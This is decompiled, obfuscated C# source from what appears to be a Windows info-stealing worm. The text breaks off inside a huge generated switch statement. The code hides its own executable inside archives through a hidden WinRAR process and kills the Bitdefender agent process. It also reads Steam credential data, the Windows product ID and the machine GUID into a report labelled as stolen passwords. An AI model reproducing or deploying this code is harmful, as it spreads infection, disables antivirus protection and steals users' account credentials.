using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Xml.XPath;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Roy.My;
using SmartAssembly.MemoryManagement;
using ns0;
using ns1;
using ns11;
using ns13;
using ns3;

namespace ns2;

internal sealed class Class34
{
	static void smethod_0(string string_0)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
		Class27.string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
		if (File.Exists(Class27.string_0))
		{
			if (!File.Exists(Path.Combine(path, Class27.string_1)))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, Class27.string_1));
			}
			StringBuilder stringBuilder = new StringBuilder(255);
			Class34.GetShortPathName(Path.Combine(path, Class27.string_1), stringBuilder, stringBuilder.Capacity);
			string text = stringBuilder.ToString();
			StringBuilder stringBuilder2 = new StringBuilder(255);
			Class34.GetShortPathName(string_0, stringBuilder2, stringBuilder2.Capacity);
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string arguments = " a " + stringBuilder2.ToString() + " " + text;
				processStartInfo.FileName = Class27.string_0;
				processStartInfo.Arguments = arguments;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string string_0, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder stringBuilder_0, int int_0);

	static DateTime smethod_1(ref Class9.Struct4 struct4_0, Class9 class9_0)
	{
		Class34.FileTimeToLocalFileTime(ref struct4_0, ref class9_0.struct4_0);
		Class34.FileTimeToSystemTime(ref class9_0.struct4_0, ref class9_0.struct3_0);
		return DateTime.FromOADate(DateAndTime.DateSerial((int)class9_0.struct3_0.short_0, (int)class9_0.struct3_0.short_1, (int)class9_0.struct3_0.short_3).ToOADate() + DateAndTime.TimeSerial((int)class9_0.struct3_0.short_4, (int)class9_0.struct3_0.short_5, (int)class9_0.struct3_0.short_6).ToOADate());
	}

	static void smethod_2(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "bdagent", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_3(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		StreamReader streamReader = default(StreamReader);
		string text6 = default(string);
		int num6 = default(int);
		int num7 = default(int);
		string text7 = default(string);
		int num9 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					int num8;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0008;
					case 587:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_0022;
							case 4:
								goto IL_0033;
							case 5:
								goto IL_0049;
							case 6:
								goto IL_005f;
							case 7:
								goto IL_0079;
							case 8:
								goto IL_0092;
							case 9:
								goto IL_00ac;
							case 10:
								goto IL_00c3;
							case 11:
								goto IL_00d4;
							case 12:
								goto IL_00e6;
							case 13:
								goto IL_00f1;
							case 14:
								goto IL_00f8;
							case 15:
								goto IL_0101;
							case 16:
								goto IL_0107;
							case 17:
								goto IL_0114;
							case 18:
								goto IL_012c;
							case 19:
								goto IL_0136;
							case 20:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 21:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0136:
						num = 19;
						num5++;
						goto IL_0140;
						IL_0008:
						num = 2;
						text = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Valve\\Steam", "SteamPath", null));
						goto IL_0022;
						IL_0022:
						num = 3;
						text += "\\SteamApps";
						goto IL_0033;
						IL_0033:
						num = 4;
						text2 = text.Replace("/", "\\");
						goto IL_0049;
						IL_0049:
						num = 5;
						text2 = text.Replace("\\SteamApps", "");
						goto IL_005f;
						IL_005f:
						num = 6;
						text3 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", null));
						goto IL_0079;
						IL_0079:
						num = 7;
						text4 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", null));
						goto IL_0092;
						IL_0092:
						num = 8;
						text5 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Valve\\Half-Life\\Settings", "io", null));
						goto IL_00ac;
						IL_00ac:
						num = 9;
						streamReader = new StreamReader(text2 + "\\ClientRegistry.blob");
						goto IL_00c3;
						IL_00c3:
						num = 10;
						text6 = streamReader.ReadToEnd().ToString();
						goto IL_00d4;
						IL_00d4:
						num = 11;
						num6 = text6.IndexOf("Phrase", 1);
						goto IL_00e6;
						IL_00e6:
						num = 12;
						num6 += 40;
						goto IL_00f1;
						IL_00f1:
						num = 13;
						num7 = num6;
						goto IL_00f8;
						IL_00f8:
						num = 14;
						num7 += 92;
						goto IL_0101;
						IL_0101:
						num = 15;
						text7 = null;
						goto IL_0107;
						IL_0107:
						num = 16;
						num8 = num6;
						num9 = num7;
						num5 = num8;
						goto IL_0140;
						IL_0140:
						if (num5 > num9)
						{
							break;
						}
						goto IL_0114;
						IL_0114:
						num = 17;
						text7 += Conversions.ToString(text6[num6]);
						goto IL_012c;
						IL_012c:
						num = 18;
						num6++;
						goto IL_0136;
						end_IL_0000_2:
						break;
					}
					num = 20;
					form1_0.string_71 = form1_0.string_71 + Environment.NewLine + Environment.NewLine + "Stem Passwrods : - " + Environment.NewLine + text3 + Environment.NewLine + text4 + Environment.NewLine + text5 + Environment.NewLine + text7 + Environment.NewLine + "Steal psd's  :" + Environment.NewLine;
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 587;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_4()
	{
		int try0000_dispatch = -1;
		int num = default(int);
		string text53 = default(string);
		int num2 = default(int);
		int num3 = default(int);
		string text52 = default(string);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		string text10 = default(string);
		string text11 = default(string);
		string text12 = default(string);
		string text13 = default(string);
		string text14 = default(string);
		string text15 = default(string);
		string text16 = default(string);
		string text17 = default(string);
		string text18 = default(string);
		string text19 = default(string);
		string text20 = default(string);
		string text21 = default(string);
		string text22 = default(string);
		string text23 = default(string);
		string text24 = default(string);
		string text25 = default(string);
		string text26 = default(string);
		string text27 = default(string);
		string text28 = default(string);
		string text29 = default(string);
		string text30 = default(string);
		string text31 = default(string);
		string text32 = default(string);
		string text33 = default(string);
		string text34 = default(string);
		string text35 = default(string);
		string text36 = default(string);
		string text37 = default(string);
		string text38 = default(string);
		string text39 = default(string);
		string text40 = default(string);
		string text41 = default(string);
		string text42 = default(string);
		string text43 = default(string);
		string text44 = default(string);
		string text45 = default(string);
		string text46 = default(string);
		string text47 = default(string);
		string text48 = default(string);
		string text49 = default(string);
		string text50 = default(string);
		string text51 = default(string);
		string text54 = default(string);
		string text55 = default(string);
		string text56 = default(string);
		string text57 = default(string);
		string text58 = default(string);
		string text59 = default(string);
		string text60 = default(string);
		string text61 = default(string);
		string text62 = default(string);
		string text63 = default(string);
		string text64 = default(string);
		string text65 = default(string);
		string text66 = default(string);
		string text67 = default(string);
		string text68 = default(string);
		string text69 = default(string);
		string text70 = default(string);
		string text71 = default(string);
		string text72 = default(string);
		string text73 = default(string);
		string text74 = default(string);
		string text75 = default(string);
		string text76 = default(string);
		string text77 = default(string);
		string text78 = default(string);
		string text79 = default(string);
		string text80 = default(string);
		string text81 = default(string);
		string text82 = default(string);
		string text83 = default(string);
		string text84 = default(string);
		string text85 = default(string);
		string text86 = default(string);
		string text87 = default(string);
		string text88 = default(string);
		string text89 = default(string);
		string text90 = default(string);
		string text91 = default(string);
		string text92 = default(string);
		string text93 = default(string);
		string text94 = default(string);
		string text95 = default(string);
		string text96 = default(string);
		string text97 = default(string);
		string text98 = default(string);
		string text99 = default(string);
		string text100 = default(string);
		string text101 = default(string);
		string text102 = default(string);
		string text103 = default(string);
		string text104 = default(string);
		string text105 = default(string);
		string text106 = default(string);
		string text107 = default(string);
		string text108 = default(string);
		string text109 = default(string);
		string text110 = default(string);
		string text111 = default(string);
		string text112 = default(string);
		string text113 = default(string);
		string text114 = default(string);
		string text115 = default(string);
		string text116 = default(string);
		string text117 = default(string);
		string text118 = default(string);
		string text119 = default(string);
		string text120 = default(string);
		string text121 = default(string);
		string text122 = default(string);
		string text123 = default(string);
		string text124 = default(string);
		string text125 = default(string);
		string text126 = default(string);
		string text127 = default(string);
		string text128 = default(string);
		string text129 = default(string);
		string text130 = default(string);
		string text131 = default(string);
		string text132 = default(string);
		string text133 = default(string);
		string text134 = default(string);
		string text135 = default(string);
		string text136 = default(string);
		string text137 = default(string);
		string text138 = default(string);
		string text139 = default(string);
		string text140 = default(string);
		string text141 = default(string);
		string text142 = default(string);
		string text143 = default(string);
		string text144 = default(string);
		string text145 = default(string);
		string text146 = default(string);
		string text147 = default(string);
		string text148 = default(string);
		string text149 = default(string);
		string text150 = default(string);
		string text151 = default(string);
		string text152 = default(string);
		string text153 = default(string);
		string text154 = default(string);
		string text155 = default(string);
		string text156 = default(string);
		string text157 = default(string);
		string text158 = default(string);
		string text159 = default(string);
		string text160 = default(string);
		string text161 = default(string);
		string text162 = default(string);
		string text163 = default(string);
		string text164 = default(string);
		string text165 = default(string);
		string text166 = default(string);
		string text167 = default(string);
		string text168 = default(string);
		string text169 = default(string);
		string text170 = default(string);
		string text171 = default(string);
		string text172 = default(string);
		string text173 = default(string);
		string text174 = default(string);
		string text175 = default(string);
		string text176 = default(string);
		string text177 = default(string);
		string text178 = default(string);
		string text179 = default(string);
		string text180 = default(string);
		string text181 = default(string);
		string text182 = default(string);
		string text183 = default(string);
		string text184 = default(string);
		string text185 = default(string);
		string text186 = default(string);
		string text187 = default(string);
		string text188 = default(string);
		string text189 = default(string);
		string text190 = default(string);
		string text191 = default(string);
		string text192 = default(string);
		string text193 = default(string);
		string text194 = default(string);
		string text195 = default(string);
		string text196 = default(string);
		string text197 = default(string);
		string text198 = default(string);
		string text199 = default(string);
		string text200 = default(string);
		string text201 = default(string);
		string text202 = default(string);
		string text203 = default(string);
		string text204 = default(string);
		string text205 = default(string);
		string text206 = default(string);
		string text207 = default(string);
		string text208 = default(string);
		string text209 = default(string);
		string text210 = default(string);
		string text211 = default(string);
		string text212 = default(string);
		string text213 = default(string);
		string text214 = default(string);
		string text215 = default(string);
		string text216 = default(string);
		string text217 = default(string);
		string text218 = default(string);
		string text219 = default(string);
		string text220 = default(string);
		string text221 = default(string);
		string text222 = default(string);
		string text223 = default(string);
		string text224 = default(string);
		string text225 = default(string);
		string text226 = default(string);
		string text227 = default(string);
		string text228 = default(string);
		string text229 = default(string);
		string text230 = default(string);
		string text231 = default(string);
		string text232 = default(string);
		string text233 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string string_;
				string string_2;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					text53 = "";
					goto IL_0008;
				case 17777:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_000f;
						case 4:
							goto IL_001d;
						case 5:
							goto IL_0035;
						case 6:
							goto IL_003f;
						case 7:
							goto IL_0046;
						case 8:
							goto IL_0054;
						case 9:
							goto IL_006d;
						case 10:
							goto IL_0079;
						case 11:
							goto IL_0080;
						case 12:
							goto IL_008f;
						case 13:
							goto IL_00a9;
						case 14:
							goto IL_00b5;
						case 15:
							goto IL_00bc;
						case 16:
							goto IL_00cb;
						case 17:
							goto IL_00e5;
						case 18:
							goto IL_00f1;
						case 19:
							goto IL_00f8;
						case 20:
							goto IL_0107;
						case 21:
							goto IL_0121;
						case 22:
							goto IL_012d;
						case 23:
							goto IL_0134;
						case 24:
							goto IL_0143;
						case 25:
							goto IL_015d;
						case 26:
							goto IL_0169;
						case 27:
							goto IL_0170;
						case 28:
							goto IL_017f;
						case 29:
							goto IL_0199;
						case 30:
							goto IL_01a5;
						case 31:
							goto IL_01ac;
						case 32:
							goto IL_01bb;
						case 33:
							goto IL_01d5;
						case 34:
							goto IL_01e1;
						case 35:
							goto IL_01e8;
						case 36:
							goto IL_01f7;
						case 37:
							goto IL_0211;
						case 38:
							goto IL_021d;
						case 39:
							goto IL_0224;
						case 40:
							goto IL_023e;
						case 41:
							goto IL_024f;
						case 42:
							goto IL_0256;
						case 43:
							goto IL_0270;
						case 44:
							goto IL_0281;
						case 45:
							goto IL_0288;
						case 46:
							goto IL_02a2;
						case 47:
							goto IL_02b3;
						case 48:
							goto IL_02ba;
						case 49:
							goto IL_02d4;
						case 50:
							goto IL_02e5;
						case 51:
							goto IL_02ec;
						case 52:
							goto IL_0306;
						case 53:
							goto IL_0317;
						case 54:
							goto IL_031e;
						case 55:
							goto IL_0338;
						case 56:
							goto IL_0349;
						case 57:
							goto IL_0350;
						case 58:
							goto IL_036a;
						case 59:
							goto IL_037b;
						case 60:
							goto IL_0382;
						case 61:
							goto IL_0391;
						case 62:
							goto IL_03ab;
						case 63:
							goto IL_03b7;
						case 64:
							goto IL_03be;
						case 65:
							goto IL_03cd;
						case 66:
							goto IL_03e7;
						case 67:
							goto IL_03f3;
						case 68:
							goto IL_03fa;
						case 69:
							goto IL_0409;
						case 70:
							goto IL_0423;
						case 71:
							goto IL_042f;
						case 72:
							goto IL_0436;
						case 73:
							goto IL_0445;
						case 74:
							goto IL_045f;
						case 75:
							goto IL_046b;
						case 76:
							goto IL_0472;
						case 77:
							goto IL_0481;
						case 78:
							goto IL_049b;
						case 79:
							goto IL_04a7;
						case 80:
							goto IL_04ae;
						case 81:
							goto IL_04bd;
						case 82:
							goto IL_04d7;
						case 83:
							goto IL_04e3;
						case 84:
							goto IL_04ea;
						case 85:
							goto IL_04f9;
						case 86:
							goto IL_0513;
						case 87:
							goto IL_051f;
						case 88:
							goto IL_0526;
						case 89:
							goto IL_0535;
						case 90:
							goto IL_054f;
						case 91:
							goto IL_055b;
						case 92:
							goto IL_0562;
						case 93:
							goto IL_0571;
						case 94:
							goto IL_058b;
						case 95:
							goto IL_0597;
						case 96:
							goto IL_059e;
						case 97:
							goto IL_05ad;
						case 98:
							goto IL_05c7;
						case 99:
							goto IL_05d3;
						case 100:
							goto IL_05da;
						case 101:
							goto IL_05e9;
						case 102:
							goto IL_0603;
						case 103:
							goto IL_060f;
						case 104:
							goto IL_0616;
						case 105:
							goto IL_0625;
						case 106:
							goto IL_063f;
						case 107:
							goto IL_064b;
						case 108:
							goto IL_0652;
						case 109:
							goto IL_0661;
						case 110:
							goto IL_067b;
						case 111:
							goto IL_0687;
						case 112:
							goto IL_068e;
						case 113:
							goto IL_069d;
						case 114:
							goto IL_06b7;
						case 115:
							goto IL_06c3;
						case 116:
							goto IL_06ca;
						case 117:
							goto IL_06d9;
						case 118:
							goto IL_06f3;
						case 119:
							goto IL_06ff;
						case 120:
							goto IL_0706;
						case 121:
							goto IL_0715;
						case 122:
							goto IL_072f;
						case 123:
							goto IL_073b;
						case 124:
							goto IL_0742;
						case 125:
							goto IL_0751;
						case 126:
							goto IL_076b;
						case 127:
							goto IL_0777;
						case 128:
							goto IL_077e;
						case 129:
							goto IL_0790;
						case 130:
							goto IL_07ad;
						case 131:
							goto IL_07bc;
						case 132:
							goto IL_07c3;
						case 133:
							goto IL_07d5;
						case 134:
							goto IL_07f2;
						case 135:
							goto IL_0801;
						case 136:
							goto IL_0808;
						case 137:
							goto IL_081a;
						case 138:
							goto IL_0837;
						case 139:
							goto IL_0846;
						case 140:
							goto IL_084d;
						case 141:
							goto IL_085f;
						case 142:
							goto IL_087c;
						case 143:
							goto IL_088b;
						case 144:
							goto IL_0892;
						case 145:
							goto IL_08a4;
						case 146:
							goto IL_08c1;
						case 147:
							goto IL_08d0;
						case 148:
							goto IL_08d7;
						case 149:
							goto IL_08e9;
						case 150:
							goto IL_0906;
						case 151:
							goto IL_0915;
						case 152:
							goto IL_091c;
						case 153:
							goto IL_092e;
						case 154:
							goto IL_094b;
						case 155:
							goto IL_095a;
						case 156:
							goto IL_0961;
						case 157:
							goto IL_0973;
						case 158:
							goto IL_0990;
						case 159:
							goto IL_099f;
						case 160:
							goto IL_09a6;
						case 161:
							goto IL_09b8;
						case 162:
							goto IL_09d5;
						case 163:
							goto IL_09e4;
						case 164:
							goto IL_09eb;
						case 165:
							goto IL_09fd;
						case 166:
							goto IL_0a1a;
						case 167:
							goto IL_0a29;
						case 168:
							goto IL_0a30;
						case 169:
							goto IL_0a42;
						case 170:
							goto IL_0a5f;
						case 171:
							goto IL_0a6e;
						case 172:
							goto IL_0a75;
						case 173:
							goto IL_0a87;
						case 174:
							goto IL_0aa4;
						case 175:
							goto IL_0ab3;
						case 176:
							goto IL_0aba;
						case 177:
							goto IL_0acc;
						case 178:
							goto IL_0ae9;
						case 179:
							goto IL_0af8;
						case 180:
							goto IL_0aff;
						case 181:
							goto IL_0b11;
						case 182:
							goto IL_0b2e;
						case 183:
							goto IL_0b3d;
						case 184:
							goto IL_0b44;
						case 185:
							goto IL_0b56;
						case 186:
							goto IL_0b73;
						case 187:
							goto IL_0b82;
						case 188:
							goto IL_0b89;
						case 189:
							goto IL_0b9b;
						case 190:
							goto IL_0bb8;
						case 191:
							goto IL_0bc7;
						case 192:
							goto IL_0bce;
						case 193:
							goto IL_0be0;
						case 194:
							goto IL_0bfd;
						case 195:
							goto IL_0c0c;
						case 196:
							goto IL_0c13;
						case 197:
							goto IL_0c25;
						case 198:
							goto IL_0c42;
						case 199:
							goto IL_0c51;
						case 200:
							goto IL_0c58;
						case 201:
							goto IL_0c6a;
						case 202:
							goto IL_0c87;
						case 203:
							goto IL_0c96;
						case 204:
							goto IL_0c9d;
						case 205:
							goto IL_0caf;
						case 206:
							goto IL_0ccc;
						case 207:
							goto IL_0cdb;
						case 208:
							goto IL_0ce2;
						case 209:
							goto IL_0cf4;
						case 210:
							goto IL_0d11;
						case 211:
							goto IL_0d20;
						case 212:
							goto IL_0d27;
						case 213:
							goto IL_0d39;
						case 214:
							goto IL_0d56;
						case 215:
							goto IL_0d65;
						case 216:
							goto IL_0d6c;
						case 217:
							goto IL_0d7e;
						case 218:
							goto IL_0d9b;
						case 219:
							goto IL_0daa;
						case 220:
							goto IL_0db1;
						case 221:
							goto IL_0dc3;
						case 222:
							goto IL_0de0;
						case 223:
							goto IL_0def;
						case 224:
							goto IL_0df6;
						case 225:
							goto IL_0e08;
						case 226:
							goto IL_0e25;
						case 227:
							goto IL_0e34;
						case 228:
							goto IL_0e3b;
						case 229:
							goto IL_0e4d;
						case 230:
							goto IL_0e6a;
						case 231:
							goto IL_0e79;
						case 232:
							goto IL_0e80;
						case 233:
							goto IL_0e92;
						case 234:
							goto IL_0eaf;
						case 235:
							goto IL_0ebe;
						case 236:
							goto IL_0ec5;
						case 237:
							goto IL_0ed7;
						case 238:
							goto IL_0ef4;
						case 239:
							goto IL_0f03;
						case 240:
							goto IL_0f0a;
						case 241:
							goto IL_0f1c;
						case 242:
							goto IL_0f39;
						case 243:
							goto IL_0f48;
						case 244:
							goto IL_0f4f;
						case 245:
							goto IL_0f61;
						case 246:
							goto IL_0f7e;
						case 247:
							goto IL_0f8d;
						case 248:
							goto IL_0f94;
						case 249:
							goto IL_0fa6;
						case 250:
							goto IL_0fc3;
						case 251:
							goto IL_0fd2;
						case 252:
							goto IL_0fd9;
						case 253:
							goto IL_0feb;
						case 254:
							goto IL_1008;
						case 255:
							goto IL_1017;
						case 256:
							goto IL_101e;
						case 257:
							goto IL_1030;
						case 258:
							goto IL_104d;
						case 259:
							goto IL_105c;
						case 260:
							goto IL_1063;
						case 261:
							goto IL_1075;
						case 262:
							goto IL_1092;
						case 263:
							goto IL_10a1;
						case 264:
							goto IL_10a8;
						case 265:
							goto IL_10ba;
						case 266:
							goto IL_10d7;
						case 267:
							goto IL_10e6;
						case 268:
							goto IL_10ed;
						case 269:
							goto IL_10ff;
						case 270:
							goto IL_111c;
						case 271:
							goto IL_112b;
						case 272:
							goto IL_1132;
						case 273:
							goto IL_1144;
						case 274:
							goto IL_1161;
						case 275:
							goto IL_1170;
						case 276:
							goto IL_1177;
						case 277:
							goto IL_1189;
						case 278:
							goto IL_11a6;
						case 279:
							goto IL_11b5;
						case 280:
							goto IL_11bc;
						case 281:
							goto IL_11ce;
						case 282:
							goto IL_11eb;
						case 283:
							goto IL_11fa;
						case 284:
							goto IL_1201;
						case 285:
							goto IL_1213;
						case 286:
							goto IL_1230;
						case 287:
							goto IL_123f;
						case 288:
							goto IL_1246;
						case 289:
							goto IL_1258;
						case 290:
							goto IL_1275;
						case 291:
							goto IL_1284;
						case 292:
							goto IL_128b;
						case 293:
							goto IL_129d;
						case 294:
							goto IL_12ba;
						case 295:
							goto IL_12c9;
						case 296:
							goto IL_12d0;
						case 297:
							goto IL_12e2;
						case 298:
							goto IL_12ff;
						case 299:
							goto IL_130e;
						case 300:
							goto IL_1315;
						case 301:
							goto IL_1327;
						case 302:
							goto IL_1344;
						case 303:
							goto IL_1353;
						case 304:
							goto IL_135a;
						case 305:
							goto IL_136c;
						case 306:
							goto IL_1389;
						case 307:
							goto IL_1398;
						case 308:
							goto IL_139f;
						case 309:
							goto IL_13b1;
						case 310:
							goto IL_13ce;
						case 311:
							goto IL_13dd;
						case 312:
							goto IL_13e4;
						case 313:
							goto IL_13f6;
						case 314:
							goto IL_1413;
						case 315:
							goto IL_1422;
						case 316:
							goto IL_1429;
						case 317:
							goto IL_143b;
						case 318:
							goto IL_1458;
						case 319:
							goto IL_1467;
						case 320:
							goto IL_146e;
						case 321:
							goto IL_1480;
						case 322:
							goto IL_149d;
						case 323:
							goto IL_14ac;
						case 324:
							goto IL_14b3;
						case 325:
							goto IL_14c5;
						case 326:
							goto IL_14e2;
						case 327:
							goto IL_14f1;
						case 328:
							goto IL_14f8;
						case 329:
							goto IL_150a;
						case 330:
							goto IL_1527;
						case 331:
							goto IL_1536;
						case 332:
							goto IL_153d;
						case 333:
							goto IL_154f;
						case 334:
							goto IL_156c;
						case 335:
							goto IL_157b;
						case 336:
							goto IL_1582;
						case 337:
							goto IL_1594;
						case 338:
							goto IL_15b1;
						case 339:
							goto IL_15c0;
						case 340:
							goto IL_15c7;
						case 341:
							goto IL_15d9;
						case 342:
							goto IL_15f6;
						case 343:
							goto IL_1605;
						case 344:
							goto IL_160c;
						case 345:
							goto IL_161e;
						case 346:
							goto IL_163b;
						case 347:
							goto IL_164a;
						case 348:
							goto IL_1651;
						case 349:
							goto IL_1663;
						case 350:
							goto IL_1680;
						case 351:
							goto IL_168f;
						case 352:
							goto IL_1696;
						case 353:
							goto IL_16a8;
						case 354:
							goto IL_16c5;
						case 355:
							goto IL_16d4;
						case 356:
							goto IL_16db;
						case 357:
							goto IL_16ed;
						case 358:
							goto IL_170a;
						case 359:
							goto IL_1719;
						case 360:
							goto IL_1720;
						case 361:
							goto IL_1732;
						case 362:
							goto IL_174f;
						case 363:
							goto IL_175e;
						case 364:
							goto IL_1765;
						case 365:
							goto IL_1777;
						case 366:
							goto IL_1794;
						case 367:
							goto IL_17a3;
						case 368:
							goto IL_17aa;
						case 369:
							goto IL_17bc;
						case 370:
							goto IL_17d9;
						case 371:
							goto IL_17e8;
						case 372:
							goto IL_17ef;
						case 373:
							goto IL_1801;
						case 374:
							goto IL_181e;
						case 375:
							goto IL_182d;
						case 376:
							goto IL_1834;
						case 377:
							goto IL_1846;
						case 378:
							goto IL_1863;
						case 379:
							goto IL_1872;
						case 380:
							goto IL_1879;
						case 381:
							goto IL_188b;
						case 382:
							goto IL_18a8;
						case 383:
							goto IL_18b7;
						case 384:
							goto IL_18be;
						case 385:
							goto IL_18d0;
						case 386:
							goto IL_18ed;
						case 387:
							goto IL_18fc;
						case 388:
							goto IL_1903;
						case 389:
							goto IL_1915;
						case 390:
							goto IL_1932;
						case 391:
							goto IL_1941;
						case 392:
							goto IL_1948;
						case 393:
							goto IL_195a;
						case 394:
							goto IL_1977;
						case 395:
							goto IL_1986;
						case 396:
							goto IL_198d;
						case 397:
							goto IL_199f;
						case 398:
							goto IL_19bc;
						case 399:
							goto IL_19cb;
						case 400:
							goto IL_19d2;
						case 401:
							goto IL_19e4;
						case 402:
							goto IL_1a01;
						case 403:
							goto IL_1a10;
						case 404:
							goto IL_1a17;
						case 405:
							goto IL_1a29;
						case 406:
							goto IL_1a46;
						case 407:
							goto IL_1a55;
						case 408:
							goto IL_1a5c;
						case 409:
							goto IL_1a6e;
						case 410:
							goto IL_1a8b;
						case 411:
							goto IL_1a9a;
						case 412:
							goto IL_1aa1;
						case 413:
							goto IL_1ab3;
						case 414:
							goto IL_1ad0;
						case 415:
							goto IL_1adf;
						case 416:
							goto IL_1ae6;
						case 417:
							goto IL_1af8;
						case 418:
							goto IL_1b15;
						case 419:
							goto IL_1b24;
						case 420:
							goto IL_1b2b;
						case 421:
							goto IL_1b3d;
						case 422:
							goto IL_1b5a;
						case 423:
							goto IL_1b69;
						case 424:
							goto IL_1b70;
						case 425:
							goto IL_1b82;
						case 426:
							goto IL_1b9f;
						case 427:
							goto IL_1bae;
						case 428:
							goto IL_1bb5;
						case 429:
							goto IL_1bc7;
						case 430:
							goto IL_1be4;
						case 431:
							goto IL_1bf3;
						case 432:
							goto IL_1bfa;
						case 433:
							goto IL_1c0c;
						case 434:
							goto IL_1c29;
						case 435:
							goto IL_1c38;
						case 436:
							goto IL_1c3f;
						case 437:
							goto IL_1c51;
						case 438:
							goto IL_1c6e;
						case 439:
							goto IL_1c7d;
						case 440:
							goto IL_1c84;
						case 441:
							goto IL_1c96;
						case 442:
							goto IL_1cb3;
						case 443:
							goto IL_1cc2;
						case 444:
							goto IL_1cc9;
						case 445:
							goto IL_1cdb;
						case 446:
							goto IL_1cf8;
						case 447:
							goto IL_1d07;
						case 448:
							goto IL_1d0e;
						case 449:
							goto IL_1d20;
						case 450:
							goto IL_1d3d;
						case 451:
							goto IL_1d4c;
						case 452:
							goto IL_1d53;
						case 453:
							goto IL_1d65;
						case 454:
							goto IL_1d82;
						case 455:
